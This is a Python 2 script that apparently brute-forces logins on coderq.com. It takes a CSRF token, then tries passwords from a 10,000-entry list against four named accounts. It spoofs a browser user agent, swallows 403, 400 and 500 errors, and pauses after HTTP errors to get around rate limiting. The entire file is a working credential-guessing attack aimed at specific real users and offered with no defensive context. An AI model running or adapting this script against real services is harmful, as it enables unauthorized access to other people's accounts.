#!/usr/bin/env python
# encoding: utf-8

__author__ = 'Kane'

import os, urllib, urllib2, json, cookielib, time

class NoExceptionCookieProcesser(urllib2.HTTPCookieProcessor):
    def http_error_403(self, req, fp, code, msg, hdrs):
        return fp

    def http_error_400(self, req, fp, code, msg, hdrs):
        return fp

    def http_error_500(self, req, fp, code, msg, hdrs):
        return fp

# opener and cookie
cj = cookielib.CookieJar()
opener = urllib2.build_opener(NoExceptionCookieProcesser(cj))

hdr = {
    'User_Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'x-requested-with': 'XMLHttpRequest'
}

def build_req(data, csrf_token, url='https://coderq.com/session'):
    hdr['x-csrf-token'] = csrf_token
    req = urllib2.Request(url, data=data, headers=hdr)
    return req

csrf = json.loads(opener.open(urllib2.Request('https://coderq.com/session/csrf', headers=hdr)).read().strip())

pwds = os.path.join(os.path.abspath('.'), '10000pwd.txt')
pwd_list = []

with open(pwds, 'r') as f:
    for line in f.readlines():
        pwd = line.split(',')[0]

        if len(pwd) >= 8:
            pwd_list.append(pwd)

# print pwd_list
username_list = ['jark', 'makaiqian', 'ibrother', 'Dpast']

pwd_len = len(pwd_list)
username_len = len(username_list)

def on_http_error(start_i, start_j):
    time.sleep(60)
    poll(start_i, start_j)

def poll(start_i, start_j):
    while start_i < pwd_len:
        while start_j < username_len:
            account = {
                'login': username_list[start_j],
                'password': pwd_list[start_i]
            }

            req = build_req(urllib.urlencode(account), csrf['csrf'])
            try:
                res = opener.open(req)
                data = res.read()
                print data
            except urllib2.HTTPError:
                on_http_error(start_i, start_j)
                break;

            start_j = start_j + 1
            time.sleep(1)

        start_i = start_i + 1

poll(0, 0)
